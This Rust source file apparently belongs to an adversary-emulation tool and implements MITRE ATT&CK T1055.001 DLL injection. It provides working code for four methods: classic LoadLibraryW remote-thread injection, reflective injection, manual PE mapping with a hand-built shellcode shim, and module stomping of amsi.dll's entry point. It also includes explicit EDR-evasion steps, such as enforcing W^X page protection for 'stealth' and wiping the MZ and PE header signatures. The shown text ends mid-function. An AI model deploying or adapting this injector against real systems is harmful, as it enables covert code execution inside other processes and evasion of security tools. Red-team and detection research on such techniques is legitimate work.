//! Implementation of **MITRE ATT&CK T1055.001: Dynamic-link Library Injection**.
//!
//! This module provides four distinct strategies for injecting DLLs into a remote process,
//! ranging from simple API abuse to advanced manual mapping and evasion techniques.
//!
//! 1. **Classic Injection (`Classic`)**:
//!    Forces the remote process to load a DLL from disk by spawning a remote thread that executes
//!    `LoadLibraryW`. This requires the DLL to exist on the filesystem.
//!
//! 2. **Reflective Injection (`Reflective`)**:
//!    Injects a DLL directly from memory without touching the disk. Requires the payload to export
//!    a custom `ReflectiveLoader` function that handles its own initialization (imports, relocations).
//!
//! 3. **Memory Module (`MemoryModule`)**:
//!    Advanced "Manual Mapping" technique. The injector manually mimics the Windows OS loader in
//!    user space: it parses PE headers, maps sections, applies relocations, resolves imports, and
//!    adjusts page permissions. Finally, it executes the Entry Point (`DllMain`) via a shellcode shim.
//!
//! 4. **Module Stomping (`ModuleStomping`)**:
//!    A stealth technique that loads a legitimate, benign DLL (e.g., `amsi.dll`) into the target,
//!    waits for it to initialize, and then overwrites its Entry Point with malicious shellcode.
//!    This makes the payload appear to be backed by a valid file on disk.

use std::{
    ffi::{OsString, c_void},
    mem::transmute,
    os::windows::{
        ffi::{OsStrExt, OsStringExt},
        raw::HANDLE,
    },
    path::Path,
    ptr::{null, null_mut},
    slice::from_raw_parts,
    thread::sleep,
    time::Duration,
};

#[cfg(target_arch = "x86")]
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;
#[cfg(target_arch = "x86_64")]
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;

use windows_sys::{
    Win32::{
        Foundation::{CloseHandle, FALSE, GetLastError, INVALID_HANDLE_VALUE},
        System::{
            Diagnostics::{
                Debug::{
                    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT,
                    IMAGE_FILE_HEADER, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ,
                    IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER, ReadProcessMemory,
                    WriteProcessMemory,
                },
                ToolHelp::{
                    CreateToolhelp32Snapshot, MODULEENTRY32W, Module32FirstW, Module32NextW,
                    TH32CS_SNAPMODULE, TH32CS_SNAPMODULE32,
                },
            },
            LibraryLoader::{GetModuleHandleW, GetProcAddress, LoadLibraryA},
            Memory::{
                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE,
                VirtualAllocEx, VirtualProtectEx,
            },
            SystemServices::{
                IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE,
                IMAGE_EXPORT_DIRECTORY, IMAGE_IMPORT_DESCRIPTOR, IMAGE_NT_SIGNATURE,
            },
            Threading::{
                CreateRemoteThread, LPTHREAD_START_ROUTINE, OpenProcess, PROCESS_CREATE_THREAD,
                PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
            },
        },
    },
    core::PCSTR,
    w,
};

use crate::{
    Error, Result, info,
    payload::Payload,
    strategy::{DynamicLinkLibrary, Strategy, Technique},
    target::Target,
};

#[cfg(target_arch = "x86")]
type ImageThunkData = u32;
#[cfg(target_arch = "x86_64")]
type ImageThunkData = u64;

#[cfg(target_arch = "x86")]
const IMAGE_ORDINAL_FLAG: ImageThunkData = 0x80000000;
#[cfg(target_arch = "x86_64")]
const IMAGE_ORDINAL_FLAG: ImageThunkData = 0x8000000000000000;

/// The concrete strategy implementation for T1055.001.
#[derive(Default)]
pub struct T1055_001;

impl Strategy for T1055_001 {
    fn execute(&self, technique: &Technique, payload: &Payload, target: &Target) -> Result<()> {
        let info = technique.info();
        info!("Strategy: {} ({})", info.mitre_id, info.name);

        let method = match technique {
            Technique::T1055_001(m) => m,
            _ => return Err(Error::Execution("Internal dispatch error".into())),
        };

        let process_id = match target {
            Target::Pid(id) => *id,
            _ => {
                return Err(Error::Validation(format!(
                    "Strategy '{}' requires a Target PID.",
                    info.mitre_id
                )));
            }
        };

        match method {
            DynamicLinkLibrary::Classic => {
                info!("Method: Classic DLL Injection (LoadLibrary)");
                let dll_path = payload.as_file_path().ok_or_else(|| {
                    Error::Validation("Classic injection requires a file path.".into())
                })?;
                inject_dll_classic(process_id, dll_path)
            }
            DynamicLinkLibrary::Reflective => {
                info!("Method: Reflective DLL Injection (Manual Map -> ReflectiveLoader)");
                let dll_bytes = payload.as_bytes().ok_or_else(|| {
                    Error::Validation("Reflective injection requires raw bytes.".into())
                })?;
                inject_dll_reflective(process_id, dll_bytes)
            }
            DynamicLinkLibrary::MemoryModule => {
                info!("Method: Memory Module (Manual Map -> Shellcode Shim -> DllMain)");
                let dll_bytes = payload
                    .as_bytes()
                    .ok_or_else(|| Error::Validation("Memory Module requires raw bytes.".into()))?;
                inject_dll_memory_module(process_id, dll_bytes)
            }
            DynamicLinkLibrary::ModuleStomping(optional_target) => {
                info!("Method: Module Stomping (Load Benign DLL -> Overwrite EntryPoint)");
                let shellcode_bytes = payload.as_bytes().ok_or_else(|| {
                    Error::Validation("Module Stomping requires shellcode bytes.".into())
                })?;
                let target_dll_name = optional_target.as_deref().unwrap_or("amsi.dll");
                inject_module_stomping(process_id, target_dll_name, shellcode_bytes)
            }
        }
    }
}

// ==============================================================================================

/// Performs "Classic" DLL Injection.
///
/// Allocates memory in the remote process, writes the DLL path, and creates a remote thread
/// executing `LoadLibraryW`.
fn inject_dll_classic(process_id: u32, dll_path: &Path) -> Result<()> {
    // 1. Prepare Data
    let path_utf16 = to_utf16_null_terminated(dll_path);
    let alloc_size = path_utf16.len() * size_of::<u16>();

    info!("Target PID: {}. Payload Path: {:?}", process_id, dll_path);

    // 2. Open Target
    let target_process = WindowsAPI::open_process(
        process_id,
        PROCESS_CREATE_THREAD
            | PROCESS_QUERY_INFORMATION
            | PROCESS_VM_OPERATION
            | PROCESS_VM_READ
            | PROCESS_VM_WRITE,
    )?;

    // 3. Allocate & Write Path
    let remote_addr = target_process.virtual_alloc_ex(alloc_size, MEM_COMMIT, PAGE_READWRITE)?;
    target_process.write_process_memory(remote_addr, &path_utf16)?;

    // 4. Resolve LoadLibraryW
    let kernel32_ptr = w!("kernel32.dll");
    let module_handle = unsafe { GetModuleHandleW(kernel32_ptr) };
    if module_handle.is_null() {
        return Err(Error::Win32("GetModuleHandleW", unsafe { GetLastError() }));
    }
    let func_name = c"LoadLibraryW";
    let load_library_addr = unsafe { GetProcAddress(module_handle, func_name.as_ptr() as PCSTR) };
    if load_library_addr.is_none() {
        return Err(Error::Win32("GetProcAddress", unsafe { GetLastError() }));
    }

    // 5. Execute
    let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(load_library_addr) };
    let _thread = target_process.create_remote_thread(routine_ptr, remote_addr)?;

    info!("Remote thread spawned. LoadLibraryW executed.");
    Ok(())
}

/// Performs "Reflective" DLL Injection.
///
/// Writes the raw DLL into the remote process and executes the `ReflectiveLoader` export.
fn inject_dll_reflective(process_id: u32, image_bytes: &[u8]) -> Result<()> {
    // 1. Analyze PE & Find Offset
    let pe_context = PeContext::parse(image_bytes)?;
    let loader_offset = pe_context
        .find_export_offset(image_bytes, "ReflectiveLoader")
        .ok_or_else(|| Error::InvalidImage("Export 'ReflectiveLoader' not found.".into()))?;

    info!(
        "ReflectiveLoader export found at offset: {:#x}",
        loader_offset
    );

    // 2. Open Target
    let target_process = WindowsAPI::open_process(
        process_id,
        PROCESS_CREATE_THREAD
            | PROCESS_QUERY_INFORMATION
            | PROCESS_VM_OPERATION
            | PROCESS_VM_READ
            | PROCESS_VM_WRITE,
    )?;

    // 3. Allocate Memory (RW)
    // Note: Allocating RWX (Read/Write/Execute) directly is often flagged by EDRs.
    let remote_addr = target_process.virtual_alloc_ex(
        image_bytes.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )?;

    // 4. Copy Raw DLL
    target_process.write_process_memory(remote_addr, image_bytes)?;

    // 5. Protect (RX)
    target_process.virtual_protect_ex(remote_addr, image_bytes.len(), PAGE_EXECUTE_READ)?;

    // 6. Execute
    let remote_loader_addr = (remote_addr as usize + loader_offset) as *const c_void;
    info!(
        "Spawning thread at remote address: {:p} (Base: {:p} + Offset: {:#x})",
        remote_loader_addr, remote_addr, loader_offset
    );

    let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(remote_loader_addr) };
    let _thread = target_process.create_remote_thread(routine_ptr, remote_addr)?;

    Ok(())
}

/// Performs "Memory Module" Injection (Manual Mapping).
///
/// Fully emulates the Windows PE Loader: maps sections, handles relocations/imports,
/// and executes `DllMain` via a shellcode shim.
fn inject_dll_memory_module(process_id: u32, image_bytes: &[u8]) -> Result<()> {
    // 1. Parse PE Headers
    let pe_context = PeContext::parse(image_bytes)?;
    let image_size = pe_context.nt_headers.OptionalHeader.SizeOfImage as usize;
    info!("Parsing PE Payload. Image Size: {} bytes.", image_size);

    // 2. Open Target
    let target_process = WindowsAPI::open_process(
        process_id,
        PROCESS_CREATE_THREAD
            | PROCESS_QUERY_INFORMATION
            | PROCESS_VM_OPERATION
            | PROCESS_VM_READ
            | PROCESS_VM_WRITE,
    )?;

    // 3. Allocate Image Memory
    let remote_addr = target_process.virtual_alloc_ex(image_size, MEM_COMMIT, PAGE_READWRITE)?;
    info!("Allocated remote image base at: {:p}", remote_addr);

    // 4. Map Headers
    let headers_size = pe_context.nt_headers.OptionalHeader.SizeOfHeaders as usize;
    target_process.write_process_memory(remote_addr, &image_bytes[0..headers_size])?;

    // 5. Map Sections
    map_sections(&target_process, &pe_context, image_bytes, remote_addr)?;

    // 6. Relocations
    let delta = (remote_addr as usize)
        .wrapping_sub(pe_context.nt_headers.OptionalHeader.ImageBase as usize);
    if delta != 0 {
        apply_relocations(
            &target_process,
            &pe_context,
            image_bytes,
            remote_addr,
            delta,
        )?;
    }

    // 7. Imports
    resolve_imports(&target_process, &pe_context, image_bytes, remote_addr)?;

    // 8. Finalize Permissions (Sections + Headers)
    finalize_permissions(&target_process, &pe_context, image_bytes, remote_addr)?;

    // 9. Execute Shellcode Shim
    // We need a shim because CreateRemoteThread only supports 1 argument, but DllMain needs 3 (Instance, Reason, Reserved).
    let entry_point_rva = pe_context.nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
    let entry_point_addr = (remote_addr as usize + entry_point_rva) as u64;

    // 10. Allocate & Write Shellcode
    let shellcode_bytes = generate_shellcode_shim(entry_point_addr)?;
    let shellcode_addr =
        target_process.virtual_alloc_ex(shellcode_bytes.len(), MEM_COMMIT, PAGE_READWRITE)?;
    target_process.write_process_memory(shellcode_addr, &shellcode_bytes[..])?;
    target_process.virtual_protect_ex(shellcode_addr, shellcode_bytes.len(), PAGE_EXECUTE_READ)?;

    info!(
        "Executing Shellcode at {:p} -> DllMain at {:#x}",
        shellcode_addr, entry_point_addr
    );

    let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(shellcode_addr) };
    let _thread = target_process.create_remote_thread(routine_ptr, remote_addr)?;

    Ok(())
}

/// Performs "Module Stomping" (DLL Hollowing).
///
/// 1. Forces the target to load a legitimate, benign DLL.
/// 2. Locates that DLL in the remote process memory.
/// 3. Overwrites the DLL's Entry Point with the malicious shellcode.
/// 4. Executes the payload.
fn inject_module_stomping(process_id: u32, target_dll_name: &str, shellcode: &[u8]) -> Result<()> {
    // 1. Inject the Benign DLL (LoadLibrary)
    info!("Loading benign DLL '{}' into target...", target_dll_name);
    let target_dll_path = Path::new(target_dll_name);
    inject_dll_classic(process_id, target_dll_path)?;

    // 2. Wait for the module to be loaded
    info!("Locating remote module base...");
    let mut remote_addr = 0;
    // Attempt to find the module for ~2 seconds
    for _ in 0..20 {
        match get_remote_module_handle(process_id, target_dll_name) {
            Ok(addr) => {
                remote_addr = addr;
                break;
            }
            Err(_) => sleep(Duration::from_millis(100)),
        }
    }

    if remote_addr == 0 {
        return Err(Error::Execution(format!(
            "Failed to locate '{}' after injection. LoadLibrary might have failed.",
            target_dll_name
        )));
    }

    let remote_base_ptr = remote_addr as *mut c_void;
    info!(
        "Remote module '{}' found at: {:p}",
        target_dll_name, remote_base_ptr
    );

    // 3. Open Target for Memory Operations
    let target_process = WindowsAPI::open_process(
        process_id,
        PROCESS_CREATE_THREAD
            | PROCESS_QUERY_INFORMATION
            | PROCESS_VM_OPERATION
            | PROCESS_VM_READ
            | PROCESS_VM_WRITE,
    )?;

    // 4. Parse Remote PE Headers to find Entry Point
    let mut header_buffer = vec![0u8; 0x1000];
    target_process.read_process_memory(remote_base_ptr, &mut header_buffer)?;

    let pe_context = PeContext::parse(&header_buffer)?;
    let entry_point_rva = pe_context.nt_headers.OptionalHeader.AddressOfEntryPoint as usize;
    let remote_entry_point = (remote_addr + entry_point_rva) as *mut c_void;

    info!(
        "Remote Entry Point RVA: {:#x} -> Address: {:p}",
        entry_point_rva, remote_entry_point
    );

    // 5. Size Check
    // Ensure we don't overwrite beyond the .text section blindly.
    if shellcode.len() > 1024 * 50 {
        return Err(Error::Validation(
            "Shellcode payload is too large for stomping.".into(),
        ));
    }

    // 6. Overwrite (Stomp)
    // Change protection to RW, write, then restore to RX/RWX.
    info!("Overwriting Entry Point with shellcode...");
    target_process.virtual_protect_ex(remote_entry_point, shellcode.len(), PAGE_READWRITE)?;
    target_process.write_process_memory(remote_entry_point, shellcode)?;
    target_process.virtual_protect_ex(remote_entry_point, shellcode.len(), PAGE_EXECUTE_READ)?;

    // 7. Execute
    info!("Spawning thread at stomped Entry Point...");
    let routine_ptr: LPTHREAD_START_ROUTINE = unsafe { transmute(remote_entry_point) };
    let _thread = target_process.create_remote_thread(routine_ptr, null())?;

    Ok(())
}

// ==============================================================================================

fn map_sections(
    target_process: &WindowsAPI,
    pe_context: &PeContext,
    image_bytes: &[u8],
    remote_addr: *mut c_void,
) -> Result<()> {
    for i in 0..pe_context.section_count {
        let section = pe_context.get_section(image_bytes, i);
        let raw_size = section.SizeOfRawData as usize;
        let raw_offset = section.PointerToRawData as usize;
        let virt_addr = section.VirtualAddress as usize;
        if raw_size == 0 {
            continue;
        }
        let dest_addr = (remote_addr as usize + virt_addr) as *mut c_void;
        if raw_offset + raw_size <= image_bytes.len() {
            target_process
                .write_process_memory(dest_addr, &image_bytes[raw_offset..raw_offset + raw_size])?;
        }
    }
    Ok(())
}

fn finalize_permissions(
    target_process: &WindowsAPI,
    pe_context: &PeContext,
    image_bytes: &[u8],
    remote_addr: *mut c_void,
) -> Result<()> {
    for i in 0..pe_context.section_count {
        let section = pe_context.get_section(image_bytes, i);
        let virt_addr = section.VirtualAddress as usize;
        let virt_size = unsafe { section.Misc.VirtualSize } as usize;
        let dest_addr = (remote_addr as usize + virt_addr) as *mut c_void;
        let chars = section.Characteristics;
        let executable = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
        let readable = (chars & IMAGE_SCN_MEM_READ) != 0;
        let writable = (chars & IMAGE_SCN_MEM_WRITE) != 0;

        // OpSec Logic: Enforce W^X (Write XOR Execute)
        // This makes the memory layout look more legitimate to EDR scanners.
        let protect = match (executable, readable, writable) {
            // [STEALTH MODE]
            // Force RX (Execute + Read) instead of RWX.
            // This is safe because Relocations/Imports (writes) are already done.
            (true, _, _) => PAGE_EXECUTE_READ,

            // Standard data (RW)
            (false, true, true) => PAGE_READWRITE,
            // Read-only data (R)
            (false, true, false) => PAGE_READONLY,
            // Fallback
            _ => PAGE_READONLY,
        };
        if virt_size > 0 {
            target_process.virtual_protect_ex(dest_addr, virt_size, protect)?;
        }
    }

    // A. Wipe "MZ" header signature (OpSec)
    let zeros_2 = vec![0u8; 2];
    target_process.write_process_memory(remote_addr, &zeros_2)?;

    // B. Wipe "PE" signature (OpSec)
    // The "PE" signature offset is stored at 0x3C (e_lfanew) in the DOS header.
    let e_lfanew_offset = 0x3C;
    if image_bytes.len() > e_lfanew_offset + 4 {
        let pe_offset = u32::from_le_bytes([
            image_bytes[e_lfanew_offset],
            image_bytes[e_lfanew_offset + 1],
            image_bytes[e_lfanew_offset + 2],
            image_bytes[e_lfanew_offset + 3],
        ]) as usize;

        let pe_sig_addr = (remote_addr as usize + pe_offset) as *mut c_void;
        let zeros_4 = vec![0u8; 4]; // Wipe "PE\0\0"
        target_process.write_process_memory(pe_sig_addr, &zeros_4)?;
    }

    // 3. Lock the header page (Read-Only)
    let header_size = pe_context.nt_headers.OptionalHeader.SizeOfHeaders as usize;
    target_process.virtual_protect_ex(remote_addr, header_size, PAGE_READONLY)?;
    Ok(())
}

fn apply_relocations(
    target_process: &WindowsAPI,
    pe_context: &PeContext,
    image_bytes: &[u8],
    remote_addr: *mut c_void,
    delta: usize,
) -> Result<()> {
    let data_dir = pe_context.nt_headers.OptionalHeader.DataDirectory;
    let reloc_dir = data_dir[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    if reloc_dir.VirtualAddress == 0 {
        return Ok(());
    }
    let mut current_offset = pe_context
        .rva_to_file_offset(reloc_dir.VirtualAddress as usize, image_bytes)
        .ok_or(Error::InvalidImage("Reloc RVA not found".into()))?;
    let end_offset = current_offset + reloc_dir.Size as usize;

    while current_offset < end_offset {
        let block =
            unsafe { &*(image_bytes.as_ptr().add(current_offset) as *const IMAGE_BASE_RELOCATION) };
        if block.SizeOfBlock == 0 {
            break;
        }
        let count =
            (block.SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>()) / size_of::<u16>();
        let page_rva = block.VirtualAddress as usize;
        let entries_ptr = unsafe {
            image_bytes
                .as_ptr()
                .add(current_offset + size_of::<IMAGE_BASE_RELOCATION>()) as *const u16
        };
        let entries = unsafe { from_raw_parts(entries_ptr, count) };

        for &entry in entries {
            let type_ = (entry >> 12) as u8;
            let offset = (entry & 0x0FFF) as usize;
            #[cfg(target_arch = "x86_64")]
            let supported = type_ == 10; // IMAGE_REL_BASED_DIR64
            #[cfg(target_arch = "x86")]
            let supported = type_ == 3; // IMAGE_REL_BASED_HIGHLOW
            if supported {
                let target_addr = (remote_addr as usize + page_rva + offset) as *mut c_void;
                let mut ptr_bytes = [0u8; size_of::<usize>()];
                target_process.read_process_memory(target_addr, &mut ptr_bytes)?;
                let original_ptr = usize::from_le_bytes(ptr_bytes);
                let patched_ptr = original_ptr.wrapping_add(delta);
                target_process.write_process_memory(target_addr, &patched_ptr.to_le_bytes())?;
            }
        }
        current_offset += block.SizeOfBlock as usize;
    }
    Ok(())
}

fn resolve_imports(
    target_process: &WindowsAPI,
    pe_context: &PeContext,
    image_bytes: &[u8],
    remote_addr: *mut c_void,
) -> Result<()> {
    let data_dir = pe_context.nt_headers.OptionalHeader.DataDirectory;
    let import_dir = data_dir[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.VirtualAddress == 0 {
        return Ok(());
    }
    let mut current_offset = pe_context
        .rva_to_file_offset(import_dir.VirtualAddress as usize, image_bytes)
        .ok_or(Error::InvalidImage("Import RVA not found".into()))?;

    loop {
        let desc = unsafe {
            &*(image_bytes.as_ptr().add(current_offset) as *const IMAGE_IMPORT_DESCRIPTOR)
        };
        if desc.Name == 0 {
            break;
        }
        let name_offset = pe_context
            .rva_to_file_offset(desc.Name as usize, image_bytes)
            .ok_or(Error::InvalidImage("Import Name RVA".into()))?;
        let lib_name = unsafe { image_bytes.as_ptr().add(name_offset) } as *const i8;
        let module_handle = unsafe { LoadLibraryA(lib_name as *const u8) };
        if module_handle.is_null() {
            return Err(Error::Win32("LoadLibraryA", unsafe { GetLastError() }));
        }
        let mut int_rva = unsafe { desc.Anonymous.OriginalFirstThunk };
        if int_rva == 0 {
            int_rva = desc.FirstThunk;
        }
        let mut int_offset = pe_context
            .rva_to_file_offset(int_rva as usize, image_bytes)
            .ok_or(Error::InvalidImage("INT RVA".into()))?;
        let mut iat_addr = (remote_addr as usize + desc.FirstThunk as usize) as *mut c_void;

        loop {
            let thunk_data =
                unsafe { *(image_bytes.as_ptr().add(int_offset) as *const ImageThunkData) };
            if thunk_data == 0 {
                break;
            }
            let func_addr = if (thunk_data & IMAGE_ORDINAL_FLAG) != 0 {
                let ordinal = (thunk_data & 0xFFFF) as u16;
                unsafe { GetProcAddress(module_handle, ordinal as usize as *const u8) }
            } else {
                let name_rva = (thunk_data & !IMAGE_ORDINAL_FLAG) as usize;
                let name_offset = pe_context
                    .rva_to_file_offset(name_rva, image_bytes)
                    .ok_or(Error::InvalidImage("HintName RVA".into()))?;
                let func_name = unsafe { image_bytes.as_ptr().add(name_offset + 2) as *const i8 };
                unsafe { GetProcAddress(module_handle, func_name as *const u8) }
            };
            let func_addr =
                func_addr.ok_or(Error::Win32("GetProcAddress", unsafe { GetLastError() }))?;
            let addr_val = func_addr as usize;
            target_process.write_process_memory(iat_addr, &addr_val.to_le_bytes())?;
            int_offset += size_of::<ImageThunkData>();
            iat_addr = (iat_addr as usize + size_of::<ImageThunkData>()) as *mut c_void;
        }
        current_offset += size_of::<IMAGE_IMPORT_DESCRIPTOR>();
    }
    Ok(())
}

fn generate_shellcode_shim(entry_point_addr: u64) -> Result<Vec<u8>> {
    #[cfg(target_arch = "x86_64")]
    {
        let mut code = Vec::new();
        // 1. Setup Arguments for DllMain(hInst, DLL_PROCESS_ATTACH, Reserved)
        // RCX is already set by CreateRemoteThread (contains remote_base)

        // MOV RDX, 1 (DLL_PROCESS_ATTACH)
        code.extend_from_slice(&[0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00]);
        // MOV R8, 0 (Reserved)
        code.extend_from_slice(&[0x49, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00]);

        // 2. Prepare Call
        // MOV RAX, <EntryPoint>
        code.extend_from_slice(&[0x48, 0xB8]);
        code.extend_from_slice(&entry_point_addr.to_le_bytes());

        // 3. Align Stack & Call
        // SUB RSP, 40 (0x28) - Shadow Space + Alignment
        code.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
        // CALL RAX
        code.extend_from_slice(&[0xFF, 0xD0]);
        // ADD RSP, 40
        code.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);

        // 4. Return
        code.push(0xC3);
        Ok(code)
    }
    #[cfg(target_arch = "x86")]
    {
        let mut code = Vec::new();
        let entry_point_u32 = entry_point_addr as u32;

        // 1. Get hInst
        // In x86, CreateRemoteThread passes the argument (remote_addr) on the stack.
        // It is located at [ESP + 4] (ESP points to the return address).

        // MOV EAX, [ESP + 4]
        code.extend_from_slice(&[0x8B, 0x44, 0x24, 0x04]);

        // 2. Push Arguments for DllMain (stdcall: Right-to-Left)
        // DllMain(hInst, DLL_PROCESS_ATTACH, Reserved)

        // Push Reserved (0) -> PUSH 0
        code.extend_from_slice(&[0x6A, 0x00]);

        // Push Reason (1) -> PUSH 1
        code.extend_from_slice(&[0x6A, 0x01]);

        // Push hInst (stored in EAX) -> PUSH EAX
        code.push(0x50);

        // 3. Prepare Call
        // MOV EAX, <EntryPoint>
        code.push(0xB8);
        code.extend_from_slice(&entry_point_u32.to_le_bytes());

        // CALL EAX
        code.extend_from_slice(&[0xFF, 0xD0]);

        // 4. Return
        // ThreadProc is stdcall and takes 1 argument (4 bytes).
        // We use RET 4 to pop the argument off the stack upon return.
        code.extend_from_slice(&[0xC2, 0x04, 0x00]);

        Ok(code)
    }
}

/// Helper: Locates the Base Address of a module in a remote process.
fn get_remote_module_handle(process_id: u32, module_name: &str) -> Result<usize> {
    let snapshot_handle =
        unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, process_id) };
    if snapshot_handle == INVALID_HANDLE_VALUE {
        return Err(Error::Win32("CreateToolhelp32Snapshot", unsafe {
            GetLastError()
        }));
    }
    let _guard = HandleGuard::new(snapshot_handle);

    let mut module_entry = MODULEENTRY32W {
        dwSize: size_of::<MODULEENTRY32W>() as u32,
        ..Default::default()
    };

    if unsafe { Module32FirstW(snapshot_handle, &mut module_entry) } == FALSE {
        return Err(Error::Execution(
            "Module32FirstW failed or no modules found".into(),
        ));
    }

    loop {
        let name_len = (0..module_entry.szModule.len())
            .find(|&i| module_entry.szModule[i] == 0)
            .unwrap_or(module_entry.szModule.len());
        let name_os = OsString::from_wide(&module_entry.szModule[0..name_len]);

        if let Some(name_str) = name_os.to_str()
            && name_str.eq_ignore_ascii_case(module_name)
        {
            return Ok(module_entry.modBaseAddr as usize);
        }

        if unsafe { Module32NextW(snapshot_handle, &mut module_entry) } == FALSE {
            break;
        }
    }

    Err(Error::Execution(format!(
        "Module '{}' not found in process {}",
        module_name, process_id
    )))
}

// ==============================================================================================

/// A helper struct to parse PE headers once and reuse the calculated offsets.
struct PeContext {
    nt_headers: IMAGE_NT_HEADERS,
    section_count: u16,
    section_header_offset: usize,
}

impl PeContext {
    fn parse(image_bytes: &[u8]) -> Result<Self> {
        if image_bytes.len() < size_of::<IMAGE_DOS_HEADER>() {
            return Err(Error::InvalidImage("File too small".into()));
        }
        let dos = unsafe { &*(image_bytes.as_ptr() as *const IMAGE_DOS_HEADER) };
        if dos.e_magic != IMAGE_DOS_SIGNATURE {
            return Err(Error::InvalidImage("Invalid DOS Sig".into()));
        }
        let nt_headers_offset = dos.e_lfanew as usize;
        if nt_headers_offset + size_of::<IMAGE_NT_HEADERS>() > image_bytes.len() {
            return Err(Error::InvalidImage("Invalid NT Offset".into()));
        }
        let nt_headers =
            unsafe { &*(image_bytes.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS) };
        if nt_headers.Signature != IMAGE_NT_SIGNATURE {
            return Err(Error::InvalidImage("Invalid NT Sig".into()));
        }
        let section_header_offset = nt_headers_offset
            + size_of::<u32>()
            + size_of::<IMAGE_FILE_HEADER>()
            + nt_headers.FileHeader.SizeOfOptionalHeader as usize;
        Ok(Self {
            nt_headers: *nt_headers,
            section_count: nt_headers.FileHeader.NumberOfSections,
            section_header_offset,
        })
    }

    fn get_section<'a>(&self, image_bytes: &'a [u8], index: u16) -> &'a IMAGE_SECTION_HEADER {
        let offset =
            self.section_header_offset + (index as usize * size_of::<IMAGE_SECTION_HEADER>());
        unsafe { &*(image_bytes.as_ptr().add(offset) as *const IMAGE_SECTION_HEADER) }
    }

    fn rva_to_file_offset(&self, rva: usize, image_bytes: &[u8]) -> Option<usize> {
        for i in 0..self.section_count {
            let section_header = self.get_section(image_bytes, i);
            let virtual_addr_start = section_header.VirtualAddress as usize;
            let virtual_addr_size = unsafe { section_header.Misc.VirtualSize } as usize;
            if rva >= virtual_addr_start && rva < virtual_addr_start + virtual_addr_size {
                let delta = rva - virtual_addr_start;
                let raw = section_header.PointerToRawData as usize;
                if raw + delta < image_bytes.len() {
                    return Some(raw + delta);
                }
            }
        }
        None
    }

    /// Finds the offset of an exported function (like "ReflectiveLoader").
    fn find_export_offset(&self, image_bytes: &[u8], target_name: &str) -> Option<usize> {
        let data_dir = self.nt_headers.OptionalHeader.DataDirectory;
        let export_rva = data_dir[0].VirtualAddress as usize;
        if export_rva == 0 {
            return None;
        }
        let export_offset = self.rva_to_file_offset(export_rva, image_bytes)?;
        let export_dir =
            unsafe { &*(image_bytes.as_ptr().add(export_offset) as *const IMAGE_EXPORT_DIRECTORY) };
        let names_offset =
            self.rva_to_file_offset(export_dir.AddressOfNames as usize, image_bytes)?;
        let ordinals_offset =
            self.rva_to_file_offset(export_dir.AddressOfNameOrdinals as usize, image_bytes)?;
        let funcs_offset =
            self.rva_to_file_offset(export_dir.AddressOfFunctions as usize, image_bytes)?;
        let names = unsafe {
            from_raw_parts(
                image_bytes.as_ptr().add(names_offset) as *const u32,
                export_dir.NumberOfNames as usize,
            )
        };
        let ordinals = unsafe {
            from_raw_parts(
                image_bytes.as_ptr().add(ordinals_offset) as *const u16,
                export_dir.NumberOfNames as usize,
            )
        };
        let funcs = unsafe {
            from_raw_parts(
                image_bytes.as_ptr().add(funcs_offset) as *const u32,
                export_dir.NumberOfFunctions as usize,
            )
        };
        for (i, &name_rva) in names.iter().enumerate() {
            if let Some(name_off) = self.rva_to_file_offset(name_rva as usize, image_bytes) {
                let name_ptr = unsafe { image_bytes.as_ptr().add(name_off) as *const i8 };
                let len = (0..)
                    .find(|&x| unsafe { *name_ptr.add(x) } == 0)
                    .unwrap_or(0);
                let name_slice = unsafe { from_raw_parts(name_ptr as *const u8, len) };
                if name_slice == target_name.as_bytes() {
                    let ordinal = ordinals[i] as usize;
                    let func_rva = funcs[ordinal];
                    return self.rva_to_file_offset(func_rva as usize, image_bytes);
                }
            }
        }
        None
    }
}

fn to_utf16_null_terminated(path: &Path) -> Vec<u16> {
    path.as_os_str().encode_wide().chain([0]).collect()
}

// ==============================================================================================

struct HandleGuard(HANDLE);

impl HandleGuard {
    fn new(handle: HANDLE) -> Self {
        Self(handle)
    }
}

impl Drop for HandleGuard {
    fn drop(&mut self) {
        if !self.0.is_null() && self.0 != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.0) };
        }
    }
}

/// Thin wrapper around Windows APIs to handle safe/unsafe boundary and errors.
struct WindowsAPI {
    handle: HandleGuard,
}

impl WindowsAPI {
    fn open_process(process_id: u32, access_rights: u32) -> Result<Self> {
        let handle = unsafe { OpenProcess(access_rights, FALSE, process_id) };
        if handle.is_null() {
            Err(Error::Win32("OpenProcess", unsafe { GetLastError() }))
        } else {
            Ok(Self {
                handle: HandleGuard::new(handle),
            })
        }
    }

    fn virtual_alloc_ex(
        &self,
        size: usize,
        allocation_type: u32,
        protection_flags: u32,
    ) -> Result<*mut c_void> {
        let addr = unsafe {
            VirtualAllocEx(
                self.handle.0,
                null(),
                size,
                allocation_type,
                protection_flags,
            )
        };
        if addr.is_null() {
